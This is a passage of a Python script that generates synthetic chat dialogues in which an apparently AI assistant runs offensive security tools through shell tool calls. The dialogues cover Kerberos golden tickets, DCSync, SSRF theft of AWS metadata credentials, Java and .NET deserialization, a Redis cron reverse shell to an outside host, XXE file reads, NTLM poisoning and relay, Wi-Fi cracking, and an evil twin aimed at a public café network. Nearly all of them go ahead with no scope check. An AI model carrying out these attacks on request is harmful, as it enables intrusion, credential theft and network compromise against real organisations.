            + tc("shell", cmd=f"impacket-ticketer -nthash {krbtgt_hash} -domain-sid S-1-5-21-... -domain {domain} administrator")),
        msg("tool", "[+] Ticket saved to administrator.ccache"),
        msg("assistant",
            "Load and test:\n"
            + tc("shell", cmd=f"export KRB5CCNAME=$(pwd)/administrator.ccache && impacket-psexec -k -no-pass administrator@dc.{domain}")),
        msg("tool", "[*] Password policy attempted; Kerberos auth; shell spawned"),
        msg("assistant", "SYSTEM on DC via impersonation. Quick, quiet exits. Rotate krbtgt twice on the defense side to invalidate all golden tickets (do NOT forget the second rotation — one leaves them valid)."),
    ]


def ad_dcsync(domain: str, dc_ip: str, user: str, pwd: str) -> list[dict]:
    return [
        msg("user", f"I have replication rights as {user}@{domain}. DCSync."),
        msg("assistant",
            tc("shell", cmd=f"impacket-secretsdump {domain}/{user}:{pwd}@{dc_ip} -just-dc -outputfile dc_dump")),
        msg("tool", "[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n"
                    "Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0:::\n"
                    "krbtgt:502:aad3b435...:abcdef1234567890abcdef1234567890:::\n"
                    "[*] Dumping cached domain logon information"),
        msg("assistant", "Full domain NT hashes dumped including krbtgt. You now have every user's hash → pass-the-hash anywhere, or Golden Ticket forever (until rotation)."),
    ]


def ad_constrained_delegation(domain: str, dc_ip: str) -> list[dict]:
    return [
        msg("user", f"Computer account has Constrained Delegation to CIFS on another host. Abuse?"),
        msg("assistant",
            f"S4U2self + S4U2proxy chain impersonating any user to the configured service.\n"
            + tc("shell", cmd=f"impacket-getST -spn cifs/target.{domain} -impersonate administrator '{domain}/svc_account:password'")),
        msg("tool", "[*] Getting TGT for user\n[*] Impersonating administrator\n[+] Got ST for cifs/target"),
        msg("assistant",
            "Now use it:\n"
            + tc("shell", cmd=f"export KRB5CCNAME=administrator.ccache && impacket-smbclient -k -no-pass administrator@target.{domain}")),
    ]


def ad_laps_readout(domain: str, dc_ip: str, user: str, pwd: str) -> list[dict]:
    return [
        msg("user", f"Read LAPS passwords from AD as {user}."),
        msg("assistant",
            "`ReadLAPSPassword` attribute grants access. Check permissions first.\n"
            + tc("shell", cmd=f"impacket-ldapsearch -u {user} -p '{pwd}' ldap://{dc_ip} '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd cn")),
        msg("tool", "dn: CN=LAPTOP-001,OU=Laptops,DC=corp,DC=local\nms-MCS-AdmPwd: r@nd0mP@ss9F!K\n"
                    "dn: CN=SRV-DB,OU=Servers,DC=corp,DC=local\nms-MCS-AdmPwd: XyZ8@C0mpLexPw!"),
        msg("assistant", "LAPS passwords readable via your account. These are local admin creds, rotated per LAPS policy. Use them for lateral movement until the rotation interval."),
    ]


AD_ADVANCED: list[list[dict]] = []
_ad_domains = [("corp.local", "10.10.10.5"), ("megacorp.thm", "10.10.45.50"),
               ("lab.local", "192.168.56.10"), ("acme.corp", "172.16.5.10")]
for dom, dc in _ad_domains:
    AD_ADVANCED.append(ad_kerberoast(dom, dc, "jdoe", "Welcome2024!"))
    AD_ADVANCED.append(ad_asreproast(dom, dc))
    AD_ADVANCED.append(ad_certipy_esc1(dom, dc, "user01", "Password1!"))
    AD_ADVANCED.append(ad_ntlmrelay_smb(dc))
    AD_ADVANCED.append(ad_dcsync(dom, dc, "jdoe", "Backup2024!"))
    AD_ADVANCED.append(ad_constrained_delegation(dom, dc))
    AD_ADVANCED.append(ad_laps_readout(dom, dc, "jdoe", "Welcome1!"))
AD_ADVANCED.append(ad_petitpotam_relay("10.10.10.5", "10.10.10.8", "10.10.10.5"))
AD_ADVANCED.append(ad_petitpotam_relay("192.168.56.10", "192.168.56.11", "192.168.56.10"))
for q in ["shortest path to Domain Admin", "find kerberoastable users I own",
          "show me all RBCD-abusable computers", "who can reach the DC"]:
    AD_ADVANCED.append(ad_bloodhound_query(q))
AD_ADVANCED.append(ad_golden_ticket("corp.local", "abcdef1234567890abcdef1234567890"))
AD_ADVANCED.append(ad_golden_ticket("megacorp.thm", "fedcba0987654321fedcba0987654321"))


# ===========================================================================
# D. CLOUD PENTEST (~60)
# ===========================================================================

def cp_pacu_session(profile: str) -> list[dict]:
    return [
        msg("user", f"Start AWS recon with Pacu using profile `{profile}`."),
        msg("assistant",
            "Pacu loads the AWS profile; `whoami` confirms identity; `iam__enum_permissions` maps what we can do.\n"
            + tc("shell", cmd=f"pacu --session {profile} --module iam__enum_permissions,iam__enum_users_roles_policies_groups")),
        msg("tool", "[+] Principal: arn:aws:iam::123456789012:user/test_user\n"
                    "[+] Confirmed permissions: iam:ListUsers, iam:GetPolicy, s3:ListAllMyBuckets, ec2:DescribeInstances\n"
                    "[+] Users enumerated: 47\n[+] Roles enumerated: 12\n[+] Overly-permissive role: OrganizationAccountAccessRole"),
        msg("assistant",
            "`OrganizationAccountAccessRole` is the sort of finding that ends the engagement early. Try assuming it:\n"
            + tc("shell", cmd="aws sts assume-role --role-arn arn:aws:iam::MEMBER:role/OrganizationAccountAccessRole --role-session-name test")),
    ]


def cp_prowler_scan(account: str) -> list[dict]:
    return [
        msg("user", f"Full CIS benchmark scan of AWS account {account}."),
        msg("assistant",
            tc("shell", cmd=f"prowler aws --compliance cis_1.5_aws --output-formats html,json-ocsf --output-directory prowler-{account}")),
        msg("tool", "Checks executed: 289\nFindings PASS: 198\nFindings FAIL: 72\nFindings MANUAL: 19\nCritical: 8\nHigh: 34"),
        msg("assistant", "72 fails including 8 criticals. For the report: focus on the criticals first (typically public S3 buckets, unrestricted security groups, root account without MFA, unencrypted RDS). HTML report is client-friendly."),
    ]


def cp_enumerate_s3(account_hint: str) -> list[dict]:
    return [
        msg("user", f"Brute force S3 bucket names for company '{account_hint}'."),
        msg("assistant",
            tc("shell", cmd=f"bucket_finder wordlist.txt {account_hint} -u && s3scanner scan --bucket-file permutations.txt --threads 10")),
        msg("tool", f"[+] {account_hint}-backups.s3.amazonaws.com (public read)\n"
                    f"[+] {account_hint}-dev.s3.amazonaws.com (public list, private objects)\n"
                    f"[+] {account_hint}-assets.s3.amazonaws.com (public read/write)"),
        msg("assistant", "Public write on `-assets` is critical — attacker can upload malicious content that's then served from your domain. Backups bucket is data leak. Pull first, then write the report."),
    ]


def cp_azurehound(tenant: str, user: str, pwd: str) -> list[dict]:
    return [
        msg("user", f"Enumerate Azure AD with AzureHound, tenant {tenant}."),
        msg("assistant",
            tc("shell", cmd=f"azurehound -u {user} -p '{pwd}' list --tenant {tenant} -o azure_data.json")),
        msg("tool", "[+] Collected: 450 users, 67 groups, 89 applications, 23 service principals\n[+] Global Administrator members: 3\n[+] Privileged Role Administrator members: 5"),
        msg("assistant",
            "AzureHound dumps the object graph; import into BloodHound. Queries to run in GUI:\n"
            "1. Shortest path to Global Admin\n"
            "2. Users with role assignable to Privileged Authentication Admin (can reset GA passwords)\n"
            "3. Applications with `Application.ReadWrite.All` — sp takeover path\n"
            "4. Conditional Access policy exclusions — bypass candidates"),
    ]


def cp_kube_hunter(cluster_ip: str) -> list[dict]:
    return [
        msg("user", f"Assess Kubernetes cluster at {cluster_ip} from external."),
        msg("assistant",
            tc("shell", cmd=f"kube-hunter --remote {cluster_ip} --quick --log debug 2>&1 | tee kube-hunter.log")),
        msg("tool",
            "[+] Open Kubelet API\n"
            "[+] Anonymous auth allowed on kubelet\n"
            "[+] kubectl exec possible on several pods\n"
            "[!] CVE-2018-1002105 — API server privilege escalation"),
        msg("assistant",
            "Anonymous kubelet + kubectl exec = basically unauthenticated RCE on any node.\n"
            + tc("shell", cmd=f"curl -k https://{cluster_ip}:10250/pods | jq '.items[].metadata.name' && curl -k -X POST 'https://{cluster_ip}:10250/run/default/<pod>/<container>' -d 'cmd=id'")),
    ]


def cp_peirates_post_ex() -> list[dict]:
    return [
        msg("user", "Got shell in a Kubernetes pod. Explore the cluster."),
        msg("assistant",
            "Peirates is the post-exploitation Swiss army knife inside pods.\n"
            + tc("shell", cmd="curl -L https://github.com/inguardians/peirates/releases/latest/download/peirates-linux-amd64 -o peirates && chmod +x peirates && ./peirates")),
        msg("tool", "peirates > [1] List pods\n[4] Steal service account tokens from every pod\n[20] Attempt AWS/GCP credential theft from IMDS\n[6] Deploy a privileged pod on the cluster\n\nSelect: 20"),
        msg("assistant", "Option 20 hits the IMDS (169.254.169.254 for AWS, metadata.google.internal for GCP) from within the pod — often returns IAM credentials bound to the node. That's your pivot point out of the cluster into the cloud account."),
    ]


def cp_aws_credentials_abuse(arn: str) -> list[dict]:
    return [
        msg("user", f"Leaked AWS creds for {arn}. First moves."),
        msg("assistant",
            "Fingerprint identity + permissions before doing anything visible.\n"
            + tc("shell", cmd="aws sts get-caller-identity && aws iam get-user && aws iam list-attached-user-policies --user-name $(aws iam get-user --query 'User.UserName' --output text)")),
        msg("tool", "UserId: AIDAEXAMPLE\nAccount: 123456789012\nArn: arn:aws:iam::123456789012:user/developer\n\n[AdministratorAccess managed policy attached]"),
        msg("assistant", "AdministratorAccess = full control. Next: `aws ec2 describe-instances`, `aws s3api list-buckets`, `aws secretsmanager list-secrets` — don't run destructive actions. Credentials might be temporary; check expiration."),
    ]


def cp_scoutsuite(cloud: str) -> list[dict]:
    return [
        msg("user", f"Full {cloud} security audit with ScoutSuite."),
        msg("assistant",
            tc("shell", cmd=f"scout {cloud} --report-dir scoutsuite-report")),
        msg("tool", f"Running {cloud} checks: 147\nFindings: 38\nCategories: IAM (12), Storage (8), Networking (10), Compute (8)\nReport: scoutsuite-report/report.html"),
        msg("assistant", "HTML report opens to a dashboard. Focus on: (1) publicly accessible storage, (2) IAM roles with wildcard principals, (3) security groups with `0.0.0.0/0` on sensitive ports, (4) unencrypted at rest."),
    ]


def cp_iam_privesc_map() -> list[dict]:
    return [
        msg("user", "Map IAM privilege escalation paths in AWS account."),
        msg("assistant",
            "pmapper builds a graph of which role/user can assume or impersonate which — privilege escalation paths surface naturally.\n"
            + tc("shell", cmd="pmapper graph create && pmapper query 'preset privesc *'")),
        msg("tool", "[privesc] developer -> iam:PassRole -> lambda-invoke -> admin_role\n[privesc] ci_role -> iam:CreateAccessKey -> root\n[privesc] backup_role -> iam:UpdateAssumeRolePolicy -> any_role"),
        msg("assistant", "Three privesc paths. `ci_role -> iam:CreateAccessKey -> root` is the nightmare one — whoever has the CI role can forge permanent credentials to the root account."),
    ]


def cp_lambda_secrets() -> list[dict]:
    return [
        msg("user", "Got list Lambda permission. Any secrets in function code or env vars?"),
        msg("assistant",
            tc("shell", cmd="for f in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do "
                            "aws lambda get-function-configuration --function-name $f --query 'Environment' --output json; "
                            "done | tee lambda_envs.json")),
        msg("tool", "{\"Variables\": {\"DB_HOST\": \"prod-db.internal\", \"DB_PASSWORD\": \"SuperSecret123!\", \"STRIPE_KEY\": \"sk_live_abc...\"}}"),
        msg("assistant", "Plaintext secrets in Lambda env vars is a common anti-pattern. You've harvested DB creds, a Stripe live key, and internal DNS. Lambda env vars are readable by anyone with `lambda:GetFunctionConfiguration` — usually broader than intended."),
    ]


CLOUD_PENTEST: list[list[dict]] = []
for prof in ["default", "dev", "prod-readonly", "security-audit"]:
    CLOUD_PENTEST.append(cp_pacu_session(prof))
for acct in ["123456789012", "987654321098", "555666777888"]:
    CLOUD_PENTEST.append(cp_prowler_scan(acct))
for hint in ["acme-corp", "megacorp", "target-company", "example-inc"]:
    CLOUD_PENTEST.append(cp_enumerate_s3(hint))
for tenant in ["corp.onmicrosoft.com", "acme.onmicrosoft.com"]:
    CLOUD_PENTEST.append(cp_azurehound(tenant, "admin@corp.onmicrosoft.com", "Password1!"))
for ip in ["10.10.10.100", "192.168.1.100", "172.16.5.100"]:
    CLOUD_PENTEST.append(cp_kube_hunter(ip))
for _ in range(3):
    CLOUD_PENTEST.append(cp_peirates_post_ex())
for arn in ["arn:aws:iam::123456789012:user/dev", "arn:aws:iam::987654321098:user/ci"]:
    CLOUD_PENTEST.append(cp_aws_credentials_abuse(arn))
for cloud in ["aws", "azure", "gcp"]:
    CLOUD_PENTEST.append(cp_scoutsuite(cloud))
CLOUD_PENTEST.append(cp_iam_privesc_map())
CLOUD_PENTEST.append(cp_iam_privesc_map())
for _ in range(3):
    CLOUD_PENTEST.append(cp_lambda_secrets())


# ===========================================================================
# E. WEB DEEP (~40)
# ===========================================================================

def web_ysoserial_java(url: str) -> list[dict]:
    return [
        msg("user", f"Java app at {url} deserializes cookies. Try ysoserial."),
        msg("assistant",
            "ysoserial generates deserialization payloads targeting CommonsCollections, Groovy, Hibernate. Start with CC6 — most common.\n"
            + tc("shell", cmd=f"java -jar ysoserial.jar CommonsCollections6 'curl http://10.10.14.5/beacon' | base64 -w0")),
        msg("tool", "rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVu..."),
        msg("assistant",
            f"Payload ready. Inject as cookie on request:\n"
            + tc("shell", cmd=f"curl '{url}' -b 'SESSION=rO0ABXNy...' -i")),
        msg("tool", "HTTP/1.1 302\n[10.10.14.5 — beacon received]"),
        msg("assistant", "Deserialization confirmed (beacon hit). Swap payload for a reverse shell or Runtime.exec chain next. CC6 works with CommonsCollections 4.0-4.1; for 3.x use CC3 or CC5."),
    ]


def web_ysoserial_dotnet(url: str) -> list[dict]:
    return [
        msg("user", f"ASP.NET ViewState on {url}. Machine key leaked. RCE?"),
        msg("assistant",
            "Yes — with machine key, ViewState signed = RCE. ysoserial.net generates the payload.\n"
            + tc("shell", cmd="ysoserial.net -p ViewState -g TypeConfuseDelegate -c 'powershell -enc <b64>' --path='/vulnerable.aspx' --apppath='/' --decryptionalg='AES' --decryptionkey='ABCD...' --validationalg='HMACSHA256' --validationkey='1234...'")),
        msg("tool", "/wEPDwULL..."),
        msg("assistant",
            f"Submit as `__VIEWSTATE`:\n"
            + tc("shell", cmd=f"curl '{url}/vulnerable.aspx' --data-urlencode '__VIEWSTATE=/wEPDwULL...'")),
    ]


def web_ssrf_aws_imds(url: str) -> list[dict]:
    return [
        msg("user", f"SSRF on {url}?fetch= and target is in AWS. Get IMDS creds."),
        msg("assistant",
            "IMDSv2 requires token; try IMDSv1 first for simplicity.\n"
            + tc("shell", cmd=f"curl -s '{url}?fetch=http://169.254.169.254/latest/meta-data/iam/security-credentials/'")),
        msg("tool", "s3-read-role"),
        msg("assistant",
            f"Role name `s3-read-role`. Pull the creds:\n"
            + tc("shell", cmd=f"curl -s '{url}?fetch=http://169.254.169.254/latest/meta-data/iam/security-credentials/s3-read-role'")),
        msg("tool", "{\"AccessKeyId\":\"ASIA...\",\"SecretAccessKey\":\"...\",\"Token\":\"...\",\"Expiration\":\"2026-04-20T22:00:00Z\"}"),
        msg("assistant", "Temporary creds exfiltrated. Configure AWS CLI with them (including session token) and enumerate. Expires in a few hours — work fast. If IMDSv2 blocked this, try `-H 'X-aws-ec2-metadata-token: ...'` via a two-step SSRF."),
    ]


def web_ssrf_gopher_redis(url: str) -> list[dict]:
    return [
        msg("user", f"SSRF on {url} can reach internal Redis on 127.0.0.1:6379. RCE?"),
        msg("assistant",
            "Gopherus generates the Gopher URL for Redis RCE via cron.\n"
            + tc("shell", cmd="gopherus --exploit redis")),
        msg("tool", "Enter FULL path of file you want to write:\n>>> /var/spool/cron/root\n\nEnter payload:\n>>> * * * * * bash -i >& /dev/tcp/10.10.14.5/9001 0>&1\n\nGenerated: gopher://127.0.0.1:6379/_*3%0d%0a..."),
        msg("assistant",
            f"Pipe as SSRF param:\n"
            + tc("shell", cmd=f"curl '{url}?fetch=gopher%3A%2F%2F127.0.0.1%3A6379%2F_...'")),
        msg("tool", "[10.10.14.5 — reverse shell as root]"),
        msg("assistant", "Root shell via Redis misconfig + SSRF. Redis in default config + SSRF = RCE almost always."),
    ]


def web_ssti_tplmap(url: str) -> list[dict]:
    return [
        msg("user", f"Suspected SSTI in {url}?name=FUZZ. Confirm and exploit."),
        msg("assistant",
            "tplmap detects engine (Jinja2, Twig, Smarty, FreeMarker, etc.) and chains to RCE.\n"
            + tc("shell", cmd=f"tplmap -u '{url}?name=FUZZ' --os-shell")),
        msg("tool", "[+] Tplmap 0.5\n[+] Engine: Jinja2\n[+] Capabilities: rce (medium), sinj (high)\n[+] Enjoy your shell\nshell $"),
        msg("assistant", "Direct OS shell via Jinja2 SSTI. The classic `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}` chain is the underlying primitive."),
    ]


def web_graphql_introspection(url: str) -> list[dict]:
    return [
        msg("user", f"GraphQL endpoint at {url}. Recon."),
        msg("assistant",
            "Introspection query dumps the entire schema, usually enabled in dev/prod.\n"
            + tc("shell", cmd=f"curl -X POST {url} -H 'Content-Type: application/json' -d '{{\"query\":\"query IntrospectionQuery {{__schema {{queryType {{name}} mutationType {{name}} types {{name fields {{name type {{name kind}}}}}}}}}}\"}}' | jq '.data.__schema.types[] | select(.name | startswith(\"__\") | not) | .name'")),
        msg("tool", "User\nSecret\nAdminPanel\ninternalDebug\nPaymentMethod\nApiKey"),
        msg("assistant",
            "Interesting types surface: `AdminPanel`, `internalDebug`, `ApiKey`, `Secret`. Run InQL or graphql-voyager for a visual map. Then test:\n"
            "1. Query types without auth\n"
            "2. Batching/nested queries for DoS\n"
            "3. Mutation access for state changes\n"
            "4. Field-level auth bypass (e.g., getting `email` via a different query that doesn't check)"),
    ]


def web_xxe_exploit(url: str) -> list[dict]:
    return [
        msg("user", f"XML input accepted by {url}/api/import. XXE?"),
        msg("assistant",
            "Standard XXE payload: declare external entity, reference `/etc/passwd`.\n"
            + tc("shell", cmd=f"curl -X POST {url}/api/import -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<foo>&xxe;</foo>'")),
        msg("tool", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n..."),
        msg("assistant",
            "XXE confirmed. Escalation options:\n"
            "1. Read app source (`file:///var/www/html/config.php`) — often leaks DB creds\n"
            "2. Blind OOB via your own XML DTD server to exfil files\n"
            "3. SSRF — XXE can hit internal services via `http://` or `ftp://`\n"
            "4. On .NET with netdoc scheme, sometimes escalates to shares"),
    ]


def web_prototype_pollution(url: str) -> list[dict]:
    return [
        msg("user", f"Node.js app at {url}. Test prototype pollution."),
        msg("assistant",
            "Send `__proto__` in POST body; check if subsequent responses reflect injected property.\n"
            + tc("shell", cmd=f"curl -X POST {url}/api/merge -H 'Content-Type: application/json' -d '{{\"__proto__\":{{\"isAdmin\":true,\"polluted\":\"yes\"}}}}'")),
        msg("tool", "{\"success\":true}"),
        msg("assistant",
            f"Now check if pollution took:\n"
            + tc("shell", cmd=f"curl {url}/api/whoami")),
        msg("tool", "{\"user\":\"guest\",\"isAdmin\":true,\"polluted\":\"yes\"}"),
        msg("assistant", "Every Object inherits the poisoned properties until process restart. `isAdmin: true` propagates to the current user context. Classic chain via `Object.prototype` in lodash/merge/deepmerge vulnerable versions."),
    ]


WEB_DEEP: list[list[dict]] = []
for url in ["http://10.10.11.42/api", "http://target.thm/login", "https://app.megacorp.thm"]:
    WEB_DEEP.append(web_ysoserial_java(url))
for url in ["http://10.10.11.77/asp", "https://app.corp/aspx"]:
    WEB_DEEP.append(web_ysoserial_dotnet(url))
for url in ["http://target.thm", "http://10.10.45.22/api", "https://app.cloud.corp"]:
    WEB_DEEP.append(web_ssrf_aws_imds(url))
for url in ["http://10.10.10.5", "http://app.lab.local"]:
    WEB_DEEP.append(web_ssrf_gopher_redis(url))
for url in ["http://10.10.11.100/hello", "http://app.thm/greet", "http://vuln.lab.local/search"]:
    WEB_DEEP.append(web_ssti_tplmap(url))
for url in ["http://api.target.com/graphql", "http://10.10.10.55/graphql", "https://app.corp/graphql"]:
    WEB_DEEP.append(web_graphql_introspection(url))
for url in ["http://target.thm/xxe", "http://10.10.45.77/import", "https://api.corp/xml"]:
    WEB_DEEP.append(web_xxe_exploit(url))
for url in ["http://node-app.thm", "https://api.corp.node"]:
    WEB_DEEP.append(web_prototype_pollution(url))


# ===========================================================================
# F. NETWORK SPECIFIC (~30)
# ===========================================================================

def net_responder(interface: str) -> list[dict]:
    return [
        msg("user", f"Start Responder on {interface} to capture NTLM hashes."),
        msg("assistant",
            "Responder poisons LLMNR/NBT-NS/mDNS — Windows hosts sending unicast queries get our answer.\n"
            + tc("shell", cmd=f"sudo responder -I {interface} -wdbF")),
        msg("tool", "[+] SMB server on\n[+] HTTP server on\n[+] MDNS poisoner on\n\n[SMB] NTLMv2-SSP Hash from 192.168.1.50:\nadmin::CORP:abcd1234:ef56...:1122"),
        msg("assistant",
            "Got an NTLMv2 hash. Pipe to hashcat:\n"
            + tc("shell", cmd="hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt --rules=best64")),
        msg("tool", "admin::CORP:abcd1234:ef56...:1122:Summer2024!"),
        msg("assistant", "Admin's NTLM password. Laterally pivot via `crackmapexec smb ... -u admin -p 'Summer2024!'` or relay if the hash itself is usable against SMB-signing-optional hosts."),
    ]


def net_mitm6(domain: str, interface: str) -> list[dict]:
    return [
        msg("user", f"IPv6 takeover on {domain} via mitm6 + ntlmrelayx."),
        msg("assistant",
            f"mitm6 becomes the DHCPv6 server + spoofs DNS for the target domain. Windows prefers IPv6, queries WPAD → gets us.\n"
            + tc("shell", cmd=f"sudo mitm6 -d {domain} -i {interface} &")),
        msg("tool", f"Sent spoofed DNS for wpad.{domain}\nClient 192.168.1.50 obtained IPv6 from us"),
        msg("assistant",
            "Simultaneously relay the auth:\n"
            + tc("shell", cmd="sudo impacket-ntlmrelayx -6 -wh wpad-prox -t ldaps://dc.corp -l lootdir")),
        msg("tool", "[+] Relayed 192.168.1.50 -> ldaps://dc.corp as CORP\\user01\n[+] Dumped domain info to lootdir/"),
        msg("assistant", "mitm6 + ntlmrelayx to LDAPS = read domain structure as the relayed user. If user has Replication rights, promote to DCSync from there."),
    ]


def net_scapy_custom(target: str) -> list[dict]:
    return [
        msg("user", f"I need to send a malformed IP fragment to {target} to test IDS evasion."),
        msg("assistant",
            "scapy lets us craft arbitrary packets. Here's a fragmented SYN designed to confuse rule-based IDSs.\n"
            + tc("shell", cmd=f"python3 -c \""
                              "from scapy.all import IP, TCP, fragment, send;"
                              f"pkt = IP(dst='{target}', flags='MF')/TCP(dport=80, flags='S');"
                              "send(fragment(pkt, fragsize=8))\"")),
        msg("tool", "Sent 3 packets."),
        msg("assistant", "Three 8-byte fragments reassemble into a SYN to port 80. Some IDSs process headers only on the first fragment; the whole SYN may sneak through. Compare target's response to a non-fragmented SYN to see if fragmentation changed behavior."),
    ]


def net_arp_scan(subnet: str) -> list[dict]:
    return [
        msg("user", f"Discover hosts on local subnet {subnet}."),
        msg("assistant",
            tc("shell", cmd=f"sudo arp-scan --interface=eth0 {subnet}")),
        msg("tool",
            "192.168.1.1      f0:9f:c2:12:34:56       Ubiquiti Networks\n"
            "192.168.1.10     b8:27:eb:ab:cd:ef       Raspberry Pi Foundation\n"
            "192.168.1.50     00:1c:42:aa:bb:cc       Parallels, Inc.\n"
            "192.168.1.100    00:05:cd:11:22:33       DENON\n"
            "192.168.1.150    ac:de:48:dd:ee:ff       PRIVATE"),
        msg("assistant", "Five hosts. Interesting: Raspberry Pi (.10) often has default creds, Parallels (.50) = VM host, DENON = AV receiver (legacy vulns, sometimes open HTTP config). 'PRIVATE' at .150 means MAC privacy is enabled — probably a phone."),
    ]


NETWORK_SPEC: list[list[dict]] = []
for iface in ["eth0", "wlan0", "tun0", "tap0"]:
    NETWORK_SPEC.append(net_responder(iface))
for dom in ["corp.local", "megacorp.thm", "acme.corp", "lab.local"]:
    NETWORK_SPEC.append(net_mitm6(dom, "eth0"))
for t in ["10.10.10.5", "192.168.56.100", "172.16.5.10"]:
    NETWORK_SPEC.append(net_scapy_custom(t))
for sub in ["192.168.1.0/24", "10.10.10.0/24", "172.16.5.0/24", "192.168.56.0/24"]:
    NETWORK_SPEC.append(net_arp_scan(sub))


# ===========================================================================
# G. WIRELESS + MOBILE (~30)
# ===========================================================================

def wifi_wifite(interface: str) -> list[dict]:
    return [
        msg("user", f"Automated Wi-Fi audit on {interface}."),
        msg("assistant",
            "wifite scans, captures handshakes, tries WPS PIN and PMKID automatically.\n"
            + tc("shell", cmd=f"sudo wifite --kill --no-wps --no-wep -i {interface}")),
        msg("tool", "[*] 12 networks found\n[+] LabNet (WPA2, ch 6, -42 dBm) — handshake captured\n[+] TestAP (WPA2, ch 11, -55 dBm) — PMKID captured\n[!] Cracking LabNet... SuperSecret2024!"),
        msg("assistant", "Two captured, one cracked live. wifite handles the workflow end-to-end, so you can leave it running while doing other recon. Feed uncracked hashes to hashcat with a bigger wordlist afterward."),
    ]


def wifi_hcx_pmkid(interface: str) -> list[dict]:
    return [
        msg("user", f"PMKID attack on {interface} — no client needed."),
        msg("assistant",
            "hcxdumptool captures PMKID frames; hcxpcapngtool converts to hashcat format.\n"
            + tc("shell", cmd=f"sudo hcxdumptool -i {interface} -o pmkid.pcapng --enable_status=1")),
        msg("tool", "Captured PMKID from AA:BB:CC:DD:EE:FF (LabNet)"),
        msg("assistant",
            tc("shell", cmd="hcxpcapngtool -o pmkid.22000 pmkid.pcapng && hashcat -m 22000 pmkid.22000 /usr/share/wordlists/rockyou.txt")),
        msg("tool", "PMKID:MAC_AP:MAC_CLIENT:ESSID:Password123!"),
        msg("assistant", "Cracked, no handshake required. Some APs emit PMKID only to certain clients — hcxdumptool can target specific MACs via `--active_beacon` and `--disable_deauthentication`."),
    ]


def wifi_evil_twin(essid: str, interface: str) -> list[dict]:
    return [
        msg("user", f"Create evil twin for `{essid}` in authorized engagement."),
        msg("assistant",
            f"airgeddon or wifiphisher automate the whole pipeline. Manual minimum: hostapd + dnsmasq + captive portal.\n"
            + tc("shell", cmd=f"sudo wifiphisher --interface {interface} --essid '{essid}' -p oauth-login")),
        msg("tool", "[+] Starting rogue AP\n[+] Targets connected: 3\n[+] Credentials captured: user@corp.local:Summer2024!"),
        msg("assistant", "Evil twin attacks only in explicitly scoped engagements — scope letter must name the SSID being impersonated. Captured creds should be treated as in-scope only; do not test against external services."),
    ]


def mobile_apk_static(apk: str) -> list[dict]:
    return [
        msg("user", f"Static analysis of {apk}."),
        msg("assistant",
            "MobSF does decompile + static checks in one run.\n"
            + tc("shell", cmd=f"curl -F 'file=@{apk}' http://localhost:8000/api/v1/upload -H 'Authorization: <api-key>' && curl -X POST http://localhost:8000/api/v1/scan -d 'hash=<hash>'")),
        msg("tool",
            "Findings:\n"
            "[HIGH] Hardcoded API key: Bearer eyJhbGci... (in src/com/app/Constants.java)\n"
            "[HIGH] android:exported=true on SettingsActivity (no permission)\n"
            "[MED] Cleartext HTTP traffic allowed (android:usesCleartextTraffic=true)\n"
            "[MED] SMS_READ permission requested"),
        msg("assistant", "Three high/medium findings visible statically. Next: dynamic analysis via Frida to observe API traffic and the exported activity's behavior at runtime."),
    ]


def mobile_frida_ssl_pinning(app: str) -> list[dict]:
    return [
        msg("user", f"Bypass SSL pinning in {app} for MITM."),
        msg("assistant",
            "Frida + objection give the one-command path.\n"
            + tc("shell", cmd=f"objection -g {app} explore -s 'android sslpinning disable'")),
        msg("tool", "[*] Attached to process: com.target.app\n[*] SSL pinning disabled via multiple hooks (OkHttp3, TrustManager, TrustKit)"),
        msg("assistant", "Now proxy the device through Burp/mitmproxy — all TLS traffic decodes. Some apps have custom pinning you'll need to hook specifically; use `objection explore` and grep for 'X509' or 'certificate' in loaded classes."),
    ]


def mobile_drozer(package: str) -> list[dict]:
    return [
        msg("user", f"Explore attack surface of {package} with drozer."),
        msg("assistant",
            tc("shell", cmd=f"drozer console connect && run app.package.attacksurface {package}")),
        msg("tool",
            f"Attack Surface:\n  3 activities exported\n  1 broadcast receiver exported\n  2 content providers exported\n  1 service exported"),
        msg("assistant",
            f"Enumerate each:\n"
            + tc("shell", cmd=f"run app.provider.finduri {package} && run scanner.provider.traversal -a {package}")),
        msg("tool", "Content URIs:\ncontent://{package}.provider/files\n[!] path traversal possible"),
        msg("assistant", "Content provider path traversal = read arbitrary app-context files. `run app.provider.read content://{package}.provider/files/../../shared_prefs/prefs.xml` often pulls session tokens."),
    ]


WIRELESS_MOBILE: list[list[dict]] = []
for iface in ["wlan0", "wlan1", "wlan0mon", "wlx001122334455"]:
    WIRELESS_MOBILE.append(wifi_wifite(iface))
    WIRELESS_MOBILE.append(wifi_hcx_pmkid(iface))
for ssid in ["CORP-GUEST", "MegaCorp-WiFi", "Starbucks"]:
    WIRELESS_MOBILE.append(wifi_evil_twin(ssid, "wlan0"))
for apk in ["target.apk", "corpapp-1.2.3.apk", "mobile-bank.apk"]:
    WIRELESS_MOBILE.append(mobile_apk_static(apk))
for pkg in ["com.target.app", "com.megacorp.mobile", "com.example.secure"]:
    WIRELESS_MOBILE.append(mobile_frida_ssl_pinning(pkg))
    WIRELESS_MOBILE.append(mobile_drozer(pkg))


# ===========================================================================
# H. OSINT ADVANCED (~20)
# ===========================================================================

def osint_shodan(query: str) -> list[dict]:
    return [
        msg("user", f"Shodan search: {query}"),
        msg("assistant",
            tc("shell", cmd=f"shodan search --fields ip_str,port,org,hostnames '{query}' --limit 50")),
        msg("tool",
            "203.0.113.50  80   Example Corp  www.example.com\n"
            "198.51.100.22 443  Example Corp  api.example.com\n"
            "203.0.113.75  22   Example Corp  bastion.example.com"),
